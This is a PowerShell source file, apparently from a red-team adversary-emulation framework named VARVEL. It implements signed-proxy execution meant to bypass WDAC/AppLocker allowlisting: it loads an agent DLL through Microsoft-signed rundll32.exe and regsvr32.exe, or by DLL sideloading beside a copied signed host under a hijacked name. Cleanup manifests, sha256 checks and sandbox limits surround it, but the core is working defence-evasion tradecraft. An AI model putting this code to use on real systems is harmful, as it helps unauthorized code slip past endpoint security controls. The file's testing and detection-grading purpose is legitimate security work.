# VARVEL - SIGNED-PROXY EXECUTION TIER, persistent PowerShell host.
#
# The governed answer to THE WALL: a nation-tier endpoint runs application
# allowlisting (WDAC/AppLocker), so the unsigned agent exe never executes there and
# PowerShell is Constrained-Language + AMSI-watched. The standard nation-grade answer
# is SIGNED-PROXY EXECUTION: run OUR logic through MICROSOFT-SIGNED binaries. This
# host is the agent-side execution half; the governance/planning half is
# engine/execproxy.mjs (technique registry, spec gate, audit hashes); the payload
# half is the DLL form of the native agent (agents/native, buildmode=c-shared).
#
# Stage-1 techniques (the registry, mirrored in engine/execproxy.mjs):
#   rundll32-class - rundll32.exe "<dll>,<Export>" [args-token]: the signed host
#                    loads our DLL directly. VarvelStatus returns immediately
#                    (recon/proof); VarvelRun/VarvelRunR are the blocking agent loop.
#   regsvr32-class - regsvr32.exe /s "<dll>" calls DllRegisterServer (S_OK, no
#                    registration side effects BY DESIGN). DOCUMENTED LIMITATION
#                    (measured 2026-08-18): the host does not exit cleanly - the Go
#                    runtime cannot be unloaded - so the host is killed after the
#                    call window and the run is recorded as load-only.
#   sideload-class - plant our DLL under a name a chosen signed host loads from its
#                    OWN directory: COPY the host exe into the governed sandbox,
#                    write our DLL beside it under the hijacked name, launch the
#                    COPY. NEVER modify a host in place, NEVER plant beside the
#                    original in system dirs - copies only, sandbox-confined.
#
# CLEANUP-PROOF (the persist-tier doctrine, enforced here in code):
#   A PLANT THAT CANNOT PROVE ITS OWN REMOVAL NEVER HAPPENS.
#   - run() snapshots the PRE-PLANT state of every target FIRST; a target that
#     already holds FOREIGN bytes is a loud 'refused-clobber', never a silent
#     overwrite; every plant is PROVEN by sha256 re-read.
#   - remove() deletes ONLY files whose live hash still matches what we planted
#     (a hash-changed plant is a loud 'refused-foreign' - we never delete what we
#     did not write) and VERIFIES ABSENCE by re-read; a removal that cannot verify
#     is 'removal-failed' - LOUD, escalated channel-side as execproxy.remove-failed.
#   - The REMOVAL MANIFEST (JSON at the job's manifestPath - the agent sandbox)
#     records every planted file with its sha256, so a LATER process can still
#     remove-verifiably what a previous incarnation planted.
#   - the 'status' op is the engagement sweep: every manifest entry re-probed LIVE;
#     clean === true ONLY with zero open entries.
#
# GOVERNANCE: both gate halves (the engagement's exec.proxy setting AND the agent's
# own -AllowProxyExec / --proxy flag) are enforced by the CALLER before a job ever
# reaches this host. Every run evidence carries the sha256 of every file planted or
# executed plus the signed host's Authenticode status - the accountability trail.
#
# Wire protocol (the REPL the Node side drives - agents/execproxy.mjs):
#   stdin:  ONE JSON job per line
#     {"op":"run","technique":"rundll32","dll":"...","export":"VarvelStatus","args":"...",
#      "host":"...","as":"...","name":"VARVEL-xxxx","sandbox":"...","manifestPath":"..."}
#     {"op":"remove","name":"..."|"all":true,"manifestPath":"...","sandbox":"..."}
#     {"op":"status","name":null|"...","manifestPath":"...","sandbox":"..."}
#   stdout: ONE JSON result per job, op FIRST (the 120-char ledger preview carries it):
#     run/remove: {"op","pid","state","names":{"<name>":{ev}},"at"}
#     status:     {"op":"status","pid","state","clean":bool,"entries":[...],"open":[...],"at"}
#
# This file is MIRROR-INLINED into agents/varvel-agent.ps1 (the real range agent is
# staged as a single self-contained file - va-boot.ps1 drops it alone). The library
# block between the ==EXECPROXY-LIB== markers is byte-identical in both files by
# convention; change one, change the other.

$ErrorActionPreference = 'Stop'

# ==EXECPROXY-LIB== begin (mirror: agents/varvel-agent.ps1) ---------------------------

function Get-VvProxySha256Hex([string]$Text) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash([Text.Encoding]::UTF8.GetBytes($Text)))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}
function Get-VvProxyTag([string]$Seed) { return 'VARVEL-' + (Get-VvProxySha256Hex $Seed).Substring(0, 8) }
function Test-VvProxyName([string]$Name) { return ([string]$Name -match '^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$') }

# File probe: @{Present;Sha256} — $null on a probe FAULT (a failed probe is never
# treated as absence; the caller turns $null into a loud unverified state).
function Probe-VvProxyFile([string]$Path) {
  try {
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return @{ Present = $false; Sha256 = $null } }
    $h = (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower()
    return @{ Present = $true; Sha256 = $h }
  } catch { return $null }
}

# The signed host's Authenticode evidence (READ-ONLY) — the "a Microsoft-signed
# binary really loaded our code" claim rides on this being reported honestly.
function Get-VvProxySig([string]$Path) {
  try {
    $sig = Get-AuthenticodeSignature -LiteralPath $Path -ErrorAction Stop
    $signer = ''
    if ($sig.SignerCertificate -and $sig.SignerCertificate.Subject) { $signer = [string]$sig.SignerCertificate.Subject }
    return @{ Status = [string]$sig.Status; Signer = $signer }
  } catch { return @{ Status = 'unreadable'; Signer = '' } }
}

function Get-VvProxyPlantDir([string]$Sandbox, [string]$Name) { return (Join-Path $Sandbox ('execproxy-' + $Name)) }

function Read-VvProxyManifest([string]$Path) {
  $m = @{ version = 1; entries = @{} }
  try {
    if (Test-Path -LiteralPath $Path -PathType Leaf) {
      $j = (Get-Content -LiteralPath $Path -Raw -ErrorAction Stop) | ConvertFrom-Json -ErrorAction Stop
      if ($j.entries) { foreach ($p in $j.entries.PSObject.Properties) { $m.entries[$p.Name] = $p.Value } }
    }
  } catch { <# a corrupt manifest is degraded honestly: entries re-record on next op #> }
  return $m
}
function Write-VvProxyManifest([string]$Path, $Manifest) {
  $obj = @{ version = 1; entries = $Manifest.entries }
  ($obj | ConvertTo-Json -Compress -Depth 8) | Set-Content -LiteralPath $Path -Encoding UTF8 -ErrorAction Stop
}

function New-VvProxyEv([string]$Technique) {
  return [ordered]@{
    state = 'failed'; technique = $Technique; command = $null
    dllSha256 = $null; hostSha256 = $null; hostSigStatus = $null; hostSigner = $null
    exitCode = $null; outputTail = $null; markerVerified = $false; stillRunning = $false
    files = @(); installVerified = $null; removalVerified = $null; note = $null; error = $null
  }
}

# Run one signed-proxy op for a name handle. Mirrors ExecProxyStore.run() in
# engine/execproxy.mjs step for step: payload proof -> pre-plant snapshot with
# foreign-clobber refusal -> plant verified by sha256 re-read -> signed-host exec.
function Invoke-VvProxyRunOne([string]$Name, $Job, $Manifest) {
  $tech = ([string]$Job.technique).ToLower()
  $ev = New-VvProxyEv $tech
  $dll = [string]$Job.dll
  $export = [string]$Job.export
  $args = [string]$Job.args
  if ($args.Contains('"')) { $ev.error = 'args must not contain double quotes - the rundll32 quoting doctrine keeps the arg tail a single literal token'; return $ev }
  # 1. THE PAYLOAD: must exist and hash. No payload, no run.
  $dllProbe = Probe-VvProxyFile $dll
  if ($null -eq $dllProbe) { $ev.error = "payload probe failed for $dll - nothing executed"; return $ev }
  if (-not $dllProbe.Present -or -not $dllProbe.Sha256) { $ev.error = "payload DLL not found or unhashable at $dll - stage it into the governed sandbox first (nothing executed)"; return $ev }
  $ev.dllSha256 = $dllProbe.Sha256

  $hostExe = $null
  $argvDisplay = $null
  if ($tech -eq 'rundll32') {
    $hostExe = Join-Path $env:SystemRoot 'System32\rundll32.exe'
    # QUOTING DOCTRINE (measured 2026-08-18, Win11 24H2, System32\rundll32.exe):
    # rundll32 re-parses its own command line and DECLINES THE LOAD when the
    # "<dll>,<Export>" token is QUOTED (the leading quote becomes part of the DLL
    # name on its parse path). The entry spec and the arg tail ride as separate
    # UNQUOTED tokens - so stage 1 requires SPACE-FREE paths (refused loudly here).
    if ($dll.Contains(' ') -or $args.Contains(' ')) {
      $ev.error = 'rundll32-class requires SPACE-FREE dll/args paths (the measured rundll32 quoting doctrine: quoted tokens are declined by its own command-line reparse) - stage under a space-free sandbox path'
      return $ev
    }
    $argvDisplay = $hostExe + ' ' + $dll + ',' + $export + $(if ($args.Length -gt 0) { ' ' + $args } else { '' })
    $ev.note = 'signed-host direct load (rundll32-class). LOLBin-detectable behavior - the detection oracle grades it.'
  } elseif ($tech -eq 'regsvr32') {
    $hostExe = Join-Path $env:SystemRoot 'System32\regsvr32.exe'
    $argvDisplay = '"' + $hostExe + '" /s "' + $dll + '"'
    $ev.note = 'regsvr32-class load-only (DllRegisterServer, S_OK, no registration side effects). Measured caveat: regsvr32 reports a nonzero exit despite our S_OK return and may linger - the load-and-call is the proof; rundll32-class is the clean leg.'
  } elseif ($tech -eq 'sideload') {
    $hostExe = [string]$Job.host
  } else {
    $ev.error = "unknown execproxy technique: $tech (stage 1 ships rundll32, regsvr32, sideload only)"; return $ev
  }

  # 2. Host proof + signature evidence (the Microsoft-signed claim is REPORTED, never assumed).
  $hostProbe = Probe-VvProxyFile $hostExe
  if ($null -eq $hostProbe -or -not $hostProbe.Present -or -not $hostProbe.Sha256) {
    $ev.error = "signed host not found or unhashable at $hostExe - nothing executed"; return $ev
  }
  $ev.hostSha256 = $hostProbe.Sha256
  $sig = Get-VvProxySig $hostExe
  $ev.hostSigStatus = $sig.Status; $ev.hostSigner = $sig.Signer

  # 3. SIDELOAD PLANTS (copies only, sandbox-confined): snapshot first, refuse foreign.
  $plantDir = $null
  if ($tech -eq 'sideload') {
    $as = ([string]$Job.as).ToLower()
    $plantDir = Get-VvProxyPlantDir ([string]$Job.sandbox) $Name
    $hostBase = Split-Path $hostExe -Leaf
    $targets = @(
      @{ role = 'host-copy'; path = (Join-Path $plantDir $hostBase); src = $hostExe; want = $ev.hostSha256 },
      @{ role = 'dll-as'; path = (Join-Path $plantDir $as); src = $dll; want = $ev.dllSha256 }
    )
    foreach ($t in $targets) {
      $rec = [ordered]@{ role = $t.role; path = $t.path; sha256 = $null; present = $false; planted = $false; removalVerified = $null; state = $null }
      $pre = Probe-VvProxyFile $t.path
      if ($null -ne $pre -and $pre.Present) {
        $rec.present = $true; $rec.sha256 = $pre.Sha256
        if ($pre.Sha256 -ne $t.want) {
          $ev.files += $rec
          $ev.state = 'refused-clobber'
          $ev.error = "plant target already holds FOREIGN bytes (sha256 $($pre.Sha256.Substring(0,12))...): $($t.path) - REFUSED to clobber it silently. execproxy-remove this name first, or pick another name handle."
          return $ev
        }
        $rec.planted = $true; $rec.state = 'planted' # idempotent: ours and intact
        $ev.files += $rec
        continue
      }
      try {
        if (-not (Test-Path -LiteralPath $plantDir)) { New-Item -ItemType Directory -Force -Path $plantDir -ErrorAction Stop | Out-Null }
        Copy-Item -LiteralPath $t.src -Destination $t.path -Force -ErrorAction Stop
      } catch {
        $ev.files += $rec
        $ev.error = "plant write failed for $($t.path): $($_.Exception.Message) - nothing claimed"
        return $ev
      }
      $post = Probe-VvProxyFile $t.path
      if ($null -eq $post -or -not $post.Present -or $post.Sha256 -ne $t.want) {
        $rec.present = ($null -ne $post -and $post.Present); $rec.sha256 = $(if ($post) { $post.Sha256 } else { $null })
        $ev.files += $rec
        $ev.error = "plant write did NOT verify (sha256 re-read mismatch) for $($t.path) - the plant is UNVERIFIED, reported honestly; remove will still take this entry back"
        Save-VvProxyEntry $Name $ev $Manifest 'failed'
        return $ev
      }
      $rec.present = $true; $rec.sha256 = $post.Sha256; $rec.planted = $true; $rec.state = 'planted'
      $ev.files += $rec
    }
    $ev.installVerified = $true
    $argvDisplay = '"' + (Join-Path $plantDir $hostBase) + '"' + $(if ($args.Length -gt 0) { ' "' + $args + '"' } else { '' })
    $hostExe = Join-Path $plantDir $hostBase
    $ev.note = 'search-order plant (sideload-class): host copy + DLL-as-name, sandbox-confined. Whether the host actually loads the planted name is MEASURED (marker/edrview), never claimed.'
  } else {
    $ev.files += [ordered]@{ role = 'payload'; path = $dll; sha256 = $ev.dllSha256; present = $true; planted = $false; removalVerified = $null; state = 'present' }
  }
  $ev.command = $argvDisplay

  # 4. EXECUTE through the signed host. rundll32/regsvr32 wait briefly; a blocking
  #    VarvelRun leg stays running BY DESIGN (stillRunning is reported honestly).
  #    rundll32's arg string is UNQUOTED per the measured quoting doctrine (the
  #    space-free check already refused anything that would need quotes).
  $argString = $null
  if ($tech -eq 'rundll32') { $argString = $dll + ',' + $export + $(if ($args.Length -gt 0) { ' ' + $args } else { '' }) }
  elseif ($tech -eq 'regsvr32') { $argString = '/s "' + $dll + '"' }
  else { $argString = $(if ($args.Length -gt 0) { '"' + $args + '"' } else { '' }) }
  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $hostExe
    $psi.Arguments = $argString
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
  } catch {
    $ev.error = "signed-host launch failed: $($_.Exception.Message)"
    Save-VvProxyEntry $Name $ev $Manifest 'failed'
    return $ev
  }
  $waitMs = 15000
  if ($tech -eq 'sideload') { $waitMs = 5000 } # a sideloaded VarvelRun blocks forever - that IS the agent
  $exited = $p.WaitForExit($waitMs)
  if ($exited) {
    $ev.exitCode = $p.ExitCode
  } else {
    $ev.stillRunning = $true
    if ($tech -eq 'regsvr32' -or $tech -eq 'rundll32') {
      # The documented regsvr32 linger (Go c-shared cannot unload) — the call already
      # happened; the host is killed so the plant set stays file-accountable.
      try { $p.Kill() } catch {}
      $p.WaitForExit()
      $ev.note += ' Host lingered after the call window and was killed (reported honestly).'
    }
  }
  # 5. The load-and-ran proof: VarvelStatus drops its marker JSON at the args path.
  if ($tech -eq 'rundll32' -and $export -eq 'VarvelStatus' -and $args.Length -gt 0) {
    $mk = Probe-VvProxyFile $args
    if ($null -ne $mk -and $mk.Present) {
      try {
        $mj = (Get-Content -LiteralPath $args -Raw -ErrorAction Stop) | ConvertFrom-Json -ErrorAction Stop
        if ($mj.marker -eq 'varvel-agent-dll') { $ev.markerVerified = $true }
      } catch { <# a file that is not our marker is not our proof #> }
    }
    if (-not $ev.markerVerified) { $ev.note += ' WARNING: the VarvelStatus marker was NOT observed at the args path - the load-and-ran proof is UNVERIFIED (reported honestly).' }
  }
  $ev.state = 'ran'
  Save-VvProxyEntry $Name $ev $Manifest 'ran'
  return $ev
}

function Save-VvProxyEntry([string]$Name, $Ev, $Manifest, [string]$State) {
  $prev = $Manifest.entries[$Name]
  $Manifest.entries[$Name] = [ordered]@{
    name = $Name; technique = $Ev.technique; command = $Ev.command
    dllSha256 = $Ev.dllSha256; hostSha256 = $Ev.hostSha256
    files = @($Ev.files | ForEach-Object { [ordered]@{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
    state = $State
    ranAt = $(if ($prev -and $prev.ranAt) { [string]$prev.ranAt } else { [DateTime]::UtcNow.ToString('o') })
    exitCode = $Ev.exitCode
    removedAt = $null; removalVerified = $null
  }
}

# Remove one name handle. Mirrors ExecProxyStore.remove(): delete ONLY files whose
# live hash still matches what we planted; verify ABSENCE by re-read; a hash-changed
# plant is a loud refused-foreign; an unverifiable removal is removal-failed (LOUD).
function Invoke-VvProxyRemoveOne([string]$Name, $Manifest, [string]$Sandbox) {
  $entry = $Manifest.entries[$Name]
  $ev = New-VvProxyEv $(if ($entry) { [string]$entry.technique } else { $null })
  if (-not $entry) {
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = 'nothing was ever run under this name handle - verified clean (no manifest entry)'
    return $ev
  }
  $ev.command = [string]$entry.command; $ev.dllSha256 = [string]$entry.dllSha256; $ev.hostSha256 = [string]$entry.hostSha256
  $planted = @($entry.files | Where-Object { $_.planted -eq $true })
  if ($planted.Count -eq 0) {
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = "$( $entry.technique )-class plants nothing (the payload DLL is the pre-staged input artifact - it is NOT deleted by remove; it was never a plant)"
    $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
    return $ev
  }
  foreach ($f in $planted) {
    $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = $true; removalVerified = $null; state = $null }
    $pre = Probe-VvProxyFile ([string]$f.path)
    if ($null -eq $pre) {
      $ev.files += $rec
      $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
      $ev.error = "pre-remove probe failed for $($f.path) - removal UNVERIFIED (LOUD; escalate)"
      return $ev
    }
    if ($pre.Present -and $pre.Sha256 -ne ([string]$f.sha256).ToLower()) {
      $rec.present = $true; $rec.sha256 = $pre.Sha256; $ev.files += $rec
      $ev.state = 'refused-foreign'
      $ev.error = "plant file now holds FOREIGN bytes (hash changed since plant): $($f.path) - REFUSED to delete what we did not write (LOUD; escalate to the operator)"
      return $ev
    }
    if ($pre.Present) {
      try { Remove-Item -LiteralPath ([string]$f.path) -Force -ErrorAction Stop }
      catch {
        $rec.present = $true; $ev.files += $rec
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = "remove failed for $($f.path): $($_.Exception.Message) - removal UNVERIFIED (LOUD; escalate; a still-running sideloaded host holds its files locked - kill it first)"
        return $ev
      }
    }
    $post = Probe-VvProxyFile ([string]$f.path)
    $rec.removalVerified = ($null -ne $post -and -not $post.Present)
    $rec.present = ($null -ne $post -and $post.Present)
    $ev.files += $rec
    if (-not $rec.removalVerified) {
      $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
      $ev.error = "remove executed but $($f.path) is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)"
      return $ev
    }
  }
  # The plant dir itself goes last (only once every file is verified gone).
  $plantDir = Get-VvProxyPlantDir $Sandbox $Name
  try { if (Test-Path -LiteralPath $plantDir) { Remove-Item -LiteralPath $plantDir -Recurse -Force -ErrorAction Stop } } catch { <# a lingering dir is reported by status, never hidden #> }
  $ev.state = 'removed'; $ev.removalVerified = $true
  $ev.note = 'every planted file was deleted and re-read absent - the plant provably holds nothing of ours'
  $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
  return $ev
}

# Live status of one manifest entry (measured now, never remembered) - the same
# state vocabulary as ExecProxyStore.status().
function Get-VvProxyEntryStatus($Entry) {
  $anyPresent = $false; $anyTampered = $false; $anyUnknown = $false
  $files = @()
  foreach ($f in $Entry.files) {
    $cur = Probe-VvProxyFile ([string]$f.path)
    $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $(if ($cur) { $cur.Sha256 } else { $null }); present = ($null -ne $cur -and $cur.Present); planted = ($f.planted -eq $true); removalVerified = $null; state = $null }
    if ($null -eq $cur) { $rec.state = 'unknown'; $anyUnknown = $true }
    elseif ($cur.Present -and $f.sha256 -and $cur.Sha256 -eq ([string]$f.sha256).ToLower()) { $rec.state = $(if ($rec.planted) { 'planted' } else { 'present' }); if ($rec.planted) { $anyPresent = $true } }
    elseif ($cur.Present) { $rec.state = 'tampered'; $anyTampered = $true; $anyPresent = $true }
    else { $rec.state = $(if ($rec.planted) { $(if ($Entry.removalVerified -eq $true) { 'removed'; $rec.removalVerified = $true } else { 'missing' }) } else { 'absent' }) }
    $files += $rec
  }
  $state = 'absent'; $note = ''
  if ($anyTampered) { $state = 'tampered'; $note = 'a planted file''s bytes CHANGED under us - reported honestly; removal refuses to delete foreign bytes' }
  elseif ($anyPresent) { $state = 'planted'; $note = 'plant files present and hash-intact at live re-read' }
  elseif ($anyUnknown) { $state = 'unknown'; $note = 'a probe failed - never assume absence' }
  elseif ($Entry.removalVerified -eq $true) { $state = 'removed'; $note = "verified absent (removal was proven at $($Entry.removedAt); still absent at this live re-read)" }
  elseif ($Entry.state -eq 'ran') { $state = 'missing'; $note = 'manifest says planted but the files are GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.' }
  return @{ state = $state; note = $note; files = $files }
}

# The op dispatcher. Returns ONE JSON string, op first.
function Invoke-VvProxyOp([string]$Op, $Job) {
  $manifestPath = [string]$Job.manifestPath
  $sandbox = [string]$Job.sandbox
  $m = Read-VvProxyManifest $manifestPath
  $at = { [DateTime]::UtcNow.ToString('o') }
  if ($Op -eq 'run') {
    $name = [string]$Job.name
    if (-not (Test-VvProxyName $name)) { throw "execproxy-run: name '$name' is not a safe plant handle" }
    $ev = Invoke-VvProxyRunOne $name $Job $m
    try { Write-VvProxyManifest $manifestPath $m } catch { $ev.note = ([string]$ev.note + ' MANIFEST WRITE FAILED - the on-disk removal record is degraded (re-run execproxy-status to re-record)').Trim() }
    $state = $ev.state
    return ([ordered]@{ op = 'run'; pid = $PID; state = $state; names = @{ $name = $ev }; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  if ($Op -eq 'remove') {
    $names = @()
    if ($Job.all -eq $true) { $names = @($m.entries.Keys) }
    else { $names = @([string]$Job.name) }
    $out = @{}
    $worst = 'removed'
    foreach ($n in $names) {
      if (-not (Test-VvProxyName $n)) { throw "execproxy-remove: name '$n' is not a safe plant handle" }
      $ev = Invoke-VvProxyRemoveOne $n $m $sandbox
      $out[$n] = $ev
      if ($ev.state -eq 'removal-failed' -or $ev.state -eq 'refused-foreign') { $worst = $ev.state }
    }
    try { Write-VvProxyManifest $manifestPath $m } catch { <# degraded, reported in evidence notes #> }
    return ([ordered]@{ op = 'remove'; pid = $PID; state = $worst; names = $out; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  if ($Op -eq 'status') {
    $names = @()
    if ($Job.name -and ([string]$Job.name).Trim().Length -gt 0) { $names = @([string]$Job.name) } else { $names = @($m.entries.Keys) }
    $entries = @(); $open = @()
    foreach ($n in $names) {
      $entry = $m.entries[$n]
      if (-not $entry) {
        $entries += [ordered]@{ name = $n; technique = $null; state = 'absent'; removalVerified = $true; note = 'no manifest entry - nothing was ever run under this handle' }
        continue
      }
      $st = Get-VvProxyEntryStatus $entry
      $closed = ($entry.removalVerified -eq $true) -and -not (@($st.files | Where-Object { $_.present -eq $true -and $_.planted -eq $true }).Count -gt 0)
      $rec = [ordered]@{ name = $n; technique = [string]$entry.technique; command = [string]$entry.command; state = $st.state; removalVerified = ($entry.removalVerified -eq $true); ranAt = [string]$entry.ranAt; removedAt = $(if ($entry.removedAt) { [string]$entry.removedAt } else { $null }); files = $st.files; note = $st.note }
      if (-not $closed) { $rec.removalVerified = $false; $open += [ordered]@{ name = $n; technique = [string]$entry.technique; state = $st.state } }
      $entries += $rec
    }
    $clean = ($open.Count -eq 0)
    $note = $(if ($clean) { $(if ($entries.Count -eq 0) { 'no signed-proxy runs were ever recorded by this agent (empty manifest) - clean' } else { 'every recorded run is verified removed - the engagement signed-proxy footprint is clean' }) } else { "$($open.Count) name handle(s) still present or removal-unverified - the engagement CANNOT be called clean; run execproxy-remove and re-audit" })
    return ([ordered]@{ op = 'status'; pid = $PID; state = $(if ($clean) { 'clean' } else { 'unclean' }); clean = $clean; entries = $entries; open = $open; note = $note; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  throw "unknown execproxy op: $Op (want run | remove | status)"
}

# ==EXECPROXY-LIB== end ----------------------------------------------------------------

# The REPL: one JSON job line in, one JSON result line out, until stdin closes. The
# removal manifest on disk keeps planted state accountable ACROSS processes (a host
# death never loses the record of what must be verifiably removed).
while ($true) {
  $line = [Console]::In.ReadLine()
  if ($null -eq $line) { break }
  $line = $line.Trim()
  if ($line.Length -eq 0) { continue }
  $out = ''
  try {
    $job = $line | ConvertFrom-Json
    $out = Invoke-VvProxyOp ([string]$job.op).ToLower() $job
  } catch {
    $out = ([ordered]@{ op = 'error'; pid = $PID; state = 'failed'; names = @{}; error = [string]$_.Exception.Message; at = [DateTime]::UtcNow.ToString('o') } | ConvertTo-Json -Compress)
  }
  [Console]::Out.WriteLine($out)
  [Console]::Out.Flush()
}
